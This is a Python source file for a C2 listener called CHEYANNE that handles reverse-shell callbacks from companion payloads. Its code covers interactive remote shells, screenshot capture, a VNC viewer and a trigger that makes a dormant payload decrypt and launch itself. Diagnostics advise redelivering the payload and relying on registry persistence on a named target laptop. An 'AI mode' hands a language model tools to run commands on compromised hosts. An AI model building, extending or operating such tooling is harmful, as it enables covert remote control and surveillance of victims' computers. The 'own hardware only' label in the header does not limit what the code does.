"""
listener.py — CHEYANNE Standalone TCP C2 Listener
22DIV / george wu
Classification: UNCLASSIFIED // ACADEMIC USE ONLY // OWN HARDWARE ONLY

Pure TCP multi-session reverse shell handler.
No Discord dependency — drop-in replacement for vader_c2_v2.py on LAN/WAN.

Receives callbacks from ghost_loader.exe / ghost_fud.exe on port 4443.
For WAN access: port-forward 4443 TCP on your router → this machine,
OR run ngrok: ngrok tcp 4443 (free tier works).

Sessions persist across reconnects (same host reuses session ID).

Usage:
    python listener.py                     # default :4443
    python listener.py --port 4444         # custom port
    python listener.py --host 0.0.0.0      # explicit bind (default)

Commands (at chey> prompt):
    sessions              list active sessions
    interact <id>         attach to session shell
    back                  detach from session, return to menu
    kill <id>             terminate session
    watch <id>            open VNC browser viewer (:8892)
    screenshot <id>       one screenshot -> downloads/
    shell <id> <cmd>      run single command, return to menu
    log                   show ops log tail
    help                  this
    exit / quit           shut down listener
"""

import os
import sys
import json
import time
import socket
import select
import threading
import subprocess
import signal
from datetime import datetime, timezone

# ── colour ──────────────────────────────────────────────────────────────────
GRN  = "\033[38;2;0;255;65m"
RED  = "\033[38;2;255;68;68m"
AMB  = "\033[38;2;255;176;0m"
CYN  = "\033[38;2;0;229;255m"
DIM  = "\033[38;2;85;85;85m"
WHT  = "\033[38;2;255;255;255m"
RST  = "\033[0m"
BOLD = "\033[1m"

# ── paths ────────────────────────────────────────────────────────────────────
ROOT     = os.path.dirname(os.path.abspath(__file__))
LOG_FILE = os.path.join(ROOT, "PENTEST_LOG.md")
DL_DIR   = os.path.join(ROOT, "downloads")
os.makedirs(DL_DIR, exist_ok=True)

LISTEN_HOST  = "0.0.0.0"
LISTEN_PORT  = 4443
MAGIC_PORT   = 4445    # ghost_iron ISUN auth port (standalone trigger listener)
MAGIC_BYTES  = b"\x49\x53\x55\x4E"  # "ISUN"
BANNER       = f"{GRN}{BOLD}CHEYANNE LISTENER{RST} {DIM}// 22DIV // own hardware only{RST}"
PROMPT      = f"{GRN}chey>{RST} "

# ── session registry ─────────────────────────────────────────────────────────
# sessions[sid] = {sock, addr, host, user, os, last_seen, active}
sessions: dict = {}
_lock = threading.Lock()
_active_sid: str | None = None   # currently interacted session


# ── helpers ──────────────────────────────────────────────────────────────────
def ts() -> str:
    return datetime.now(timezone.utc).strftime("%Y-%m-%d %H:%M:%S UTC")


def log_event(msg: str):
    line = f"\n### [{ts()}] {msg}"
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(line + "\n")
    except Exception:
        pass


def print_banner():
    print()
    print(f"  {BOLD}{GRN}{'═'*52}{RST}")
    print(f"  {BANNER}")
    print(f"  {DIM}Listening on {LISTEN_HOST}:{LISTEN_PORT}{RST}")
    print(f"  {DIM}Type  help  for commands{RST}")
    print(f"  {BOLD}{GRN}{'═'*52}{RST}")
    print()


def print_sessions():
    with _lock:
        if not sessions:
            print(f"  {DIM}No active sessions.{RST}")
            return
        print(f"  {'ID':<10} {'HOST':<20} {'USER':<15} {'ADDR':<22} {'LAST'}")
        print(f"  {DIM}{'─'*75}{RST}")
        for sid, s in sessions.items():
            ago = int(time.time() - s["last_seen"])
            star = f"{GRN}●{RST}" if s["active"] else f"{DIM}○{RST}"
            print(f"  {star} {GRN}{sid:<8}{RST}  {s['host']:<20} {s['user']:<15} "
                  f"{s['addr'][0]}:{s['addr'][1]:<6}  {ago}s ago")


def send_cmd(sid: str, cmd: str, timeout: float = 8.0) -> str:
    """Send command, collect response until next prompt marker."""
    with _lock:
        sess = sessions.get(sid)
    if not sess or not sess["active"]:
        return ""
    sock: socket.socket = sess["sock"]
    try:
        sock.sendall((cmd + "\n").encode("utf-8", errors="replace"))
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            r, _, _ = select.select([sock], [], [], 0.3)
            if r:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
                # ghost_loader sends a trailing '\n> ' or similar prompt — collect until idle
                if b"\n" in chunk and time.time() - deadline + timeout > 1.0:
                    # give 0.5s for trailing output to arrive
                    time.sleep(0.5)
                    r2, _, _ = select.select([sock], [], [], 0.3)
                    if r2:
                        extra = sock.recv(65536)
                        if extra:
                            buf += extra
                    break
        return buf.decode("utf-8", errors="replace").strip()
    except Exception as e:
        return f"[send error: {e}]"


def send_raw(sid: str, data: bytes, timeout: float = 5.0) -> bytes:
    with _lock:
        sess = sessions.get(sid)
    if not sess or not sess["active"]:
        return b""
    sock: socket.socket = sess["sock"]
    try:
        sock.sendall(data)
        buf = b""
        deadline = time.time() + timeout
        while time.time() < deadline:
            r, _, _ = select.select([sock], [], [], 0.3)
            if r:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
        return buf
    except Exception:
        return b""


# ── accept loop ──────────────────────────────────────────────────────────────
def accept_loop(server_sock: socket.socket):
    while True:
        try:
            client, addr = server_sock.accept()
        except OSError:
            break
        threading.Thread(target=handle_session, args=(client, addr), daemon=True).start()


def handle_session(sock: socket.socket, addr: tuple):
    """Negotiate new session, add to registry."""
    sock.settimeout(15.0)
    try:
        # read greeting line: ghost_loader sends "OK> " or similar
        greeting = b""
        try:
            while True:
                c = sock.recv(1)
                if not c or c == b"\n":
                    break
                greeting += c
        except Exception:
            pass
        greeting_str = greeting.decode("utf-8", errors="replace").strip()

        # Ask for sysinfo
        sock.sendall(b"whoami\n")
        time.sleep(0.3)
        user_raw = b""
        sock.settimeout(3.0)
        try:
            user_raw = sock.recv(4096)
        except Exception:
            pass
        user = user_raw.decode("utf-8", errors="replace").strip().splitlines()[-1] if user_raw else "unknown"

        sock.sendall(b"hostname\n")
        time.sleep(0.3)
        host_raw = b""
        try:
            host_raw = sock.recv(4096)
        except Exception:
            pass
        host = host_raw.decode("utf-8", errors="replace").strip().splitlines()[-1] if host_raw else addr[0]

        # stable session ID = md5(host+user)
        import hashlib
        sid = hashlib.md5(f"{host}{user}".encode()).hexdigest()[:8]

        with _lock:
            sessions[sid] = {
                "sock":      sock,
                "addr":      addr,
                "host":      host,
                "user":      user,
                "os":        "",
                "last_seen": time.time(),
                "active":    True,
                "greeting":  greeting_str,
            }

        sock.settimeout(None)
        print(f"\n  {GRN}[+] NEW SESSION {sid}  {addr[0]}:{addr[1]}  {user}@{host}{RST}")
        log_event(f"NEW SESSION {sid} — {user}@{host} from {addr[0]}:{addr[1]}")

        # keepalive monitor
        while True:
            try:
                r, _, _ = select.select([sock], [], [], 30)
                if r:
                    data = sock.recv(1)
                    if not data:
                        break
                with _lock:
                    sessions[sid]["last_seen"] = time.time()
            except Exception:
                break

    except Exception as e:
        pass
    finally:
        try:
            sid_dead = None
            with _lock:
                for s, v in sessions.items():
                    if v["sock"] is sock:
                        v["active"] = False
                        sid_dead = s
                        break
            if sid_dead:
                print(f"\n  {AMB}[-] SESSION LOST: {sid_dead}{RST}")
                log_event(f"SESSION LOST: {sid_dead}")
        except Exception:
            pass
        try:
            sock.close()
        except Exception:
            pass


# ── interactive shell loop ───────────────────────────────────────────────────
def interact(sid: str):
    with _lock:
        sess = sessions.get(sid)
    if not sess or not sess["active"]:
        print(f"  {RED}[!] Session {sid} not active.{RST}")
        return
    print(f"\n  {GRN}[*] Attached to {sid}  ({sess['user']}@{sess['host']})  Ctrl+C or 'back' to detach{RST}\n")
    sock: socket.socket = sess["sock"]
    sock.settimeout(None)

    log_event(f"INTERACT START: {sid}")

    def recv_thread():
        try:
            while True:
                r, _, _ = select.select([sock], [], [], 1.0)
                if r:
                    data = sock.recv(4096)
                    if not data:
                        print(f"\n  {AMB}[-] Session {sid} disconnected.{RST}")
                        return
                    sys.stdout.write(data.decode("utf-8", errors="replace"))
                    sys.stdout.flush()
        except Exception:
            pass

    rt = threading.Thread(target=recv_thread, daemon=True)
    rt.start()

    try:
        while True:
            try:
                cmd = input()
            except (EOFError, KeyboardInterrupt):
                print()
                break
            if cmd.strip().lower() in ("back", "exit", "detach"):
                break
            sock.sendall((cmd + "\n").encode("utf-8", errors="replace"))
            log_event(f"CMD → {sid}: {cmd}")
    finally:
        log_event(f"INTERACT END: {sid}")
        print(f"  {DIM}[*] Detached from {sid}{RST}")


# ── screenshot via TCP ────────────────────────────────────────────────────────
def take_screenshot(sid: str) -> str | None:
    """
    Send screenshot command to session.
    ghost_loader's screenshot command returns base64 JPEG between markers.
    Returns local path or None.
    """
    with _lock:
        sess = sessions.get(sid)
    if not sess or not sess["active"]:
        print(f"  {RED}[!] Session {sid} not active.{RST}")
        return None

    sock: socket.socket = sess["sock"]
    print(f"  {DIM}[*] Requesting screenshot from {sid}...{RST}")
    sock.sendall(b"screenshot\n")

    buf = b""
    deadline = time.time() + 15.0
    while time.time() < deadline:
        try:
            r, _, _ = select.select([sock], [], [], 1.0)
            if r:
                chunk = sock.recv(65536)
                if not chunk:
                    break
                buf += chunk
                # look for base64 end marker
                if b"SCREENSHOT_END" in buf or b"</screenshot>" in buf:
                    break
                # fallback: stop after 200KB idle
                if len(buf) > 200_000 and time.time() - deadline + 15 > 3:
                    break
        except Exception:
            break

    raw = buf.decode("utf-8", errors="replace")
    import re, base64
    # Try to extract base64 block between markers if present
    m = re.search(r"SCREENSHOT_START\s*([\w+/=\n]+)\s*SCREENSHOT_END", raw)
    if m:
        b64 = m.group(1).replace("\n", "").strip()
    else:
        # hope the whole response is b64
        b64 = raw.strip()

    try:
        img = base64.b64decode(b64)
        fname = os.path.join(DL_DIR, f"ss_{sid}_{int(time.time())}.jpg")
        with open(fname, "wb") as f:
            f.write(img)
        print(f"  {GRN}[+] Screenshot saved: {fname}{RST}")
        return fname
    except Exception as e:
        print(f"  {RED}[!] Screenshot decode failed: {e}{RST}")
        return None


# ── VNC watch (launches watch_stream.py) ─────────────────────────────────────
def launch_watch(sid: str):
    with _lock:
        sess = sessions.get(sid)
    if not sess or not sess["active"]:
        print(f"  {RED}[!] Session {sid} not active.{RST}")
        return
    host, port = sess["addr"]
    # watch_stream.py attaches to the TCP shell connection
    ws = os.path.join(ROOT, "watch_stream.py")
    if not os.path.exists(ws):
        print(f"  {RED}[!] watch_stream.py not found at {ws}{RST}")
        return
    print(f"  {GRN}[*] Launching VNC viewer (HTTP :8892) for session {sid}...{RST}")
    subprocess.Popen([sys.executable, ws, "--attach", sid], cwd=ROOT)
    import webbrowser
    time.sleep(1.5)
    webbrowser.open("http://localhost:8892")


# ── tcp diagnostic ───────────────────────────────────────────────────────────
def _diagnose():
    print(f"\n  {CYN}[DIAGNOSE] Running TCP session check...{RST}\n")

    # 1 — session summary
    with _lock:
        total   = len(sessions)
        shells  = sum(1 for s in sessions.values() if s["active"])
        beacons = 0  # listener.py only handles TCP — discord beacons live elsewhere

    print(f"  Sessions : {GRN}{total}{RST} total  |  {GRN}{shells}{RST} active TCP shells")

    # 2 — confirm port is bound (we're inside the listener so it must be, but sanity check)
    try:
        result = subprocess.run(
            ["powershell", "-c", f"netstat -ano | findstr :{LISTEN_PORT}"],
            capture_output=True, text=True, timeout=5
        )
        lines = [l for l in result.stdout.splitlines() if "LISTENING" in l]
        if lines:
            pid_match = __import__("re").search(r"\s+(\d+)$", lines[0].strip())
            pid = pid_match.group(1) if pid_match else "?"
            print(f"  Port {LISTEN_PORT} : {GRN}BOUND{RST} (PID {pid} — this process)")
        else:
            print(f"  Port {LISTEN_PORT} : {RED}NOT FOUND in netstat — listener may be misconfigured{RST}")
    except Exception as e:
        print(f"  Port check  : {AMB}skipped ({e}){RST}")

    # 3 — firewall check
    try:
        fw = subprocess.run(
            ["powershell", "-c",
             f"(Get-NetFirewallRule | Where-Object {{$_.Enabled -eq 'True' -and $_.Direction -eq 'Inbound'}} | "
             f"Get-NetFirewallPortFilter | Where-Object {{$_.LocalPort -eq '{LISTEN_PORT}'}}).Count"],
            capture_output=True, text=True, timeout=6
        )
        count = fw.stdout.strip()
        if count and int(count) > 0:
            print(f"  Firewall    : {GRN}rule exists ({count} inbound rule(s) for {LISTEN_PORT}){RST}")
        else:
            print(f"  Firewall    : {AMB}NO inbound rule for {LISTEN_PORT} — Windows Firewall may be blocking callbacks{RST}")
    except Exception:
        print(f"  Firewall    : {DIM}check skipped{RST}")

    # 4 — LAN IP
    try:
        lan_ip = socket.gethostbyname(socket.gethostname())
        print(f"  LAN IP      : {WHT}{lan_ip}{RST}")
    except Exception:
        lan_ip = "unknown"
        print(f"  LAN IP      : {DIM}unknown{RST}")

    # 5 — verdict + options
    print()
    if shells == 0:
        print(f"  {AMB}[!] Zero active TCP shells. Root cause options:{RST}\n")
        print(f"  {GRN}A){RST} Payload not running yet — re-deliver via Discord beacon:")
        print(f"     {DIM}interact <discord-sid>  →  C:\\Users\\Public\\ghost_loader.exe{RST}")
        print(f"  {GRN}B){RST} Registry persistence set but target hasn't logged in/out yet")
        print(f"     {DIM}wait for Radon_Laptop1 relogin OR use option A to force-run now{RST}")
        print(f"  {GRN}C){RST} Firewall blocking inbound {LISTEN_PORT} — add rule:")
        print(f"     {DIM}netsh advfirewall firewall add rule name=\"C2\" dir=in action=allow protocol=TCP localport={LISTEN_PORT}{RST}")
    else:
        print(f"  {GRN}[+] {shells} active shell(s). All good.{RST}")

    # trailing PALPATINE prompt — copy/paste to AI
    print(f"  {DIM}{'─'*60}{RST}")
    print(f"  {CYN}[PALPATINE PROMPT]{RST} paste this to your AI:\n")
    if shells == 0:
        active_sids = [sid for sid, s in sessions.items() if s["active"]]
        sid_str = active_sids[0] if active_sids else "<no active sessions>"
        print(f"  CHEYANNE diagnose report:")
        print(f"  - TCP shells: 0  |  Listener: BOUND on {lan_ip}:{LISTEN_PORT}")
        print(f"  - Active session IDs: {', '.join(active_sids) if active_sids else 'none'}")
        print(f"  - Options A/B/C shown. Awaiting instruction.")
        print(f"  What do I do next? Run the tool.")
    else:
        sids = [sid for sid, s in sessions.items() if s["active"]]
        print(f"  CHEYANNE diagnose report:")
        print(f"  - TCP shells: {shells}  |  Session IDs: {', '.join(sids)}")
        print(f"  - Listener: BOUND on {lan_ip}:{LISTEN_PORT}")
        print(f"  All good. Which session to interact with?")
    print(f"  {DIM}{'─'*60}{RST}")
    print()


# ── main command loop ─────────────────────────────────────────────────────────
def cmd_loop():
    print_banner()
    while True:
        try:
            line = input(PROMPT).strip()
        except (EOFError, KeyboardInterrupt):
            print()
            print(f"  {DIM}Shutting down.{RST}")
            break

        if not line:
            continue

        parts = line.split(maxsplit=2)
        cmd   = parts[0].lower()

        if cmd in ("exit", "quit", "q"):
            log_event("LISTENER SHUTDOWN")
            break

        elif cmd == "help":
            print(f"""
  {GRN}sessions{RST}              list active sessions
  {GRN}interact <id>{RST}         attach interactive shell
  {GRN}back{RST}                  detach (also: exit, detach inside interact)
  {GRN}kill <id>{RST}             close session
  {GRN}watch <id>{RST}            VNC browser viewer (:8892)
  {GRN}screenshot <id>{RST}       one screenshot → downloads/
  {GRN}shell <id> <cmd>{RST}      run single command
  {GRN}diagnose{RST}              TCP session health check + options
  {GRN}log{RST}                   tail PENTEST_LOG.md
  {GRN}exit{RST}                  shut down listener
""")

        elif cmd == "sessions":
            print_sessions()

        elif cmd == "interact":
            if len(parts) < 2:
                print(f"  {RED}Usage: interact <session-id>{RST}")
                continue
            interact(parts[1])

        elif cmd == "kill":
            if len(parts) < 2:
                print(f"  {RED}Usage: kill <session-id>{RST}")
                continue
            sid = parts[1]
            with _lock:
                s = sessions.get(sid)
                if s:
                    s["active"] = False
                    try:
                        s["sock"].close()
                    except Exception:
                        pass
                    print(f"  {AMB}[-] Killed {sid}{RST}")
                    log_event(f"KILL SESSION: {sid}")
                else:
                    print(f"  {RED}[!] No session: {sid}{RST}")

        elif cmd == "watch":
            if len(parts) < 2:
                print(f"  {RED}Usage: watch <session-id>{RST}")
                continue
            launch_watch(parts[1])

        elif cmd == "screenshot":
            if len(parts) < 2:
                print(f"  {RED}Usage: screenshot <session-id>{RST}")
                continue
            take_screenshot(parts[1])

        elif cmd == "shell":
            if len(parts) < 3:
                print(f"  {RED}Usage: shell <id> <command>{RST}")
                continue
            out = send_cmd(parts[1], parts[2], timeout=12.0)
            print(out)
            log_event(f"SHELL → {parts[1]}: {parts[2]}\n{out}")

        elif cmd == "diagnose":
            _diagnose()

        elif cmd == "log":
            try:
                with open(LOG_FILE, "r", encoding="utf-8") as f:
                    lines = f.readlines()
                print("".join(lines[-60:]))
            except Exception:
                print(f"  {DIM}No log found at {LOG_FILE}{RST}")

        else:
            print(f"  {DIM}Unknown command: {cmd}. Type help.{RST}")


# ── ghost_iron ISUN magic trigger ────────────────────────────────────────────
def magic_trigger_loop(host: str = "0.0.0.0", port: int = MAGIC_PORT):
    """
    Listens on port for ghost_iron connections.
    Sends ISUN (4 bytes) immediately on accept -- triggers payload decrypt+launch.
    Run alongside main listener: python listener.py --magic
    """
    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((host, port))
    except OSError as e:
        print(f"  {RED}[!] MAGIC port bind failed ({port}): {e}{RST}")
        return
    srv.listen(5)
    print(f"  {CYN}[*] GHOST IRON magic trigger on {host}:{port}  (sends ISUN on connect){RST}")
    log_event(f"MAGIC TRIGGER started on {host}:{port}")
    while True:
        try:
            conn, addr = srv.accept()
        except OSError:
            break
        try:
            conn.sendall(MAGIC_BYTES)
            conn.close()
            print(f"  {GRN}[+] ISUN sent to {addr[0]}:{addr[1]}  -- ghost_iron should fire{RST}")
            log_event(f"ISUN SENT to {addr[0]}:{addr[1]}")
        except Exception as e:
            print(f"  {RED}[!] MAGIC send failed: {e}{RST}")


# ── ai mode (Kimi tool loop, no Discord) ─────────────────────────────────────
_AI_TOOLS = [
    {"type": "function", "function": {
        "name": "list_sessions",
        "description": "List all active TCP shell sessions",
        "parameters": {"type": "object", "properties": {}}
    }},
    {"type": "function", "function": {
        "name": "run_shell_cmd",
        "description": "Run a command on an active TCP session and return output",
        "parameters": {"type": "object", "properties": {
            "session_id": {"type": "string", "description": "8-char session ID"},
            "command":    {"type": "string", "description": "Command to run on target"}
        }, "required": ["session_id", "command"]}
    }},
    {"type": "function", "function": {
        "name": "diagnose_tcp",
        "description": "Run full TCP diagnostic — port check, session count, firewall, options",
        "parameters": {"type": "object", "properties": {}}
    }},
    {"type": "function", "function": {
        "name": "run_local_cmd",
        "description": "Run a PowerShell command on the operator machine",
        "parameters": {"type": "object", "properties": {
            "command": {"type": "string", "description": "PowerShell command"}
        }, "required": ["command"]}
    }},
]


def _ai_tool_exec(name, args):
    if name == "list_sessions":
        with _lock:
            if not sessions:
                return "No active sessions."
            lines = []
            for sid, s in sessions.items():
                ago = int(time.time() - s["last_seen"])
                lines.append(f"{sid}  {s['user']}@{s['host']}  {s['addr'][0]}  {ago}s ago  {'ACTIVE' if s['active'] else 'DEAD'}")
        return "\n".join(lines)

    elif name == "run_shell_cmd":
        out = send_cmd(args["session_id"], args["command"], timeout=12.0)
        log_event(f"AI CMD → {args['session_id']}: {args['command']}\n{out}")
        return out or "(no output)"

    elif name == "diagnose_tcp":
        import io, contextlib
        buf = io.StringIO()
        with contextlib.redirect_stdout(buf):
            _diagnose()
        return buf.getvalue()

    elif name == "run_local_cmd":
        r = subprocess.run(
            ["powershell", "-c", args["command"]],
            capture_output=True, text=True, timeout=30
        )
        return (r.stdout or "") + (r.stderr or "")

    return f"Unknown tool: {name}"


def ai_cmd_loop():
    try:
        from openai import OpenAI
    except ImportError:
        print(f"  {RED}[!] openai package not installed: pip install openai{RST}")
        return

    import os as _os
    api_key = _os.getenv("OPENROUTER_API_KEY") or _os.getenv("KIMI_API_KEY")
    if not api_key:
        print(f"  {RED}[!] Set OPENROUTER_API_KEY or KIMI_API_KEY in environment{RST}")
        return

    kimi = OpenAI(api_key=api_key, base_url="https://openrouter.ai/api/v1")
    model = "moonshotai/kimi-k2.5"

    sys_prompt = (
        "You are PALPATINE, AI operator for CHEYANNE C2 framework. "
        "You have tool access to TCP sessions and the operator machine. "
        "Use tools to answer questions and execute ops. Be concise. "
        "Operator machine: 192.168.1.92. Target: Radon_Laptop1 (192.168.1.145). "
        "Always use run_shell_cmd to execute commands on sessions. "
        "Always use diagnose_tcp when operator reports TCP issues. "
        "When you find active sessions, report the session ID and suggest interacting."
    )

    messages = [{"role": "system", "content": sys_prompt}]

    print_banner()
    print(f"  {CYN}[AI MODE]{RST} PALPATINE online — Kimi K2.5 via OpenRouter")
    print(f"  {DIM}Type natural language. 'back' to return to standard mode. 'exit' to quit.{RST}\n")

    while True:
        try:
            user_input = input(f"{GRN}vader>{RST} ").strip()
        except (EOFError, KeyboardInterrupt):
            print()
            break
        if not user_input:
            continue
        if user_input.lower() in ("exit", "quit"):
            break
        if user_input.lower() == "back":
            print(f"  {DIM}Returning to standard mode...{RST}")
            cmd_loop()
            break

        messages.append({"role": "user", "content": user_input})

        while True:
            resp = kimi.chat.completions.create(
                model=model,
                messages=messages,
                tools=_AI_TOOLS,
                tool_choice="auto",
                max_tokens=1024,
            )
            msg = resp.choices[0].message
            messages.append(msg)

            if msg.tool_calls:
                for tc in msg.tool_calls:
                    import json as _json
                    args = _json.loads(tc.function.arguments or "{}")
                    print(f"  {CYN}[TOOL]{RST} {tc.function.name}({', '.join(f'{k}={v!r}' for k,v in args.items())})")
                    result = _ai_tool_exec(tc.function.name, args)
                    print(f"  {DIM}{result[:300]}{RST}")
                    messages.append({
                        "role": "tool",
                        "tool_call_id": tc.id,
                        "content": result
                    })
            else:
                print(f"\n  {WHT}{msg.content}{RST}\n")
                break


# ── startup helpers ──────────────────────────────────────────────────────────
def _kill_port(port):
    """Kill any existing process bound to port before we try to bind."""
    try:
        r = subprocess.run(
            ["powershell", "-c", f"netstat -ano | findstr :{port}"],
            capture_output=True, text=True, timeout=5
        )
        pids = set()
        for line in r.stdout.splitlines():
            if f":{port}" in line and "LISTENING" in line:
                parts = line.strip().split()
                if parts:
                    pids.add(parts[-1])
        for pid in pids:
            try:
                subprocess.run(["taskkill", "/PID", pid, "/F"],
                               capture_output=True, timeout=5)
                print(f"  {AMB}[~] Killed stale listener PID {pid} on :{port}{RST}")
                log_event(f"AUTO-KILL: PID {pid} on :{port}")
            except Exception:
                pass
        if pids:
            import time as _t; _t.sleep(0.5)
    except Exception:
        pass


# ── entry ────────────────────────────────────────────────────────────────────
def main():
    import argparse
    parser = argparse.ArgumentParser(description="CHEYANNE Standalone TCP Listener")
    parser.add_argument("--host", default=LISTEN_HOST)
    parser.add_argument("--port", type=int, default=LISTEN_PORT)
    parser.add_argument("--magic", action="store_true",
                        help=f"Also start ghost_iron ISUN trigger on port {MAGIC_PORT}")
    parser.add_argument("--magic-port", type=int, default=MAGIC_PORT, dest="magic_port")
    parser.add_argument("--ai", action="store_true",
                        help="AI mode — Kimi K2.5 operator brain with tool use (no Discord)")
    args = parser.parse_args()

    _kill_port(args.port)

    srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    try:
        srv.bind((args.host, args.port))
    except OSError as e:
        print(f"{RED}[!] Bind failed: {e}{RST}")
        sys.exit(1)
    srv.listen(10)

    # catch Ctrl+C cleanly
    def _sig(sig, frame):
        print(f"\n  {DIM}Caught signal — closing listener.{RST}")
        srv.close()
        sys.exit(0)
    signal.signal(signal.SIGINT, _sig)

    log_event(f"LISTENER STARTED on {args.host}:{args.port}")
    threading.Thread(target=accept_loop, args=(srv,), daemon=True).start()

    if args.magic:
        threading.Thread(target=magic_trigger_loop,
                         args=(args.host, args.magic_port), daemon=True).start()

    if args.ai:
        ai_cmd_loop()
    else:
        cmd_loop()
    srv.close()


if __name__ == "__main__":
    main()
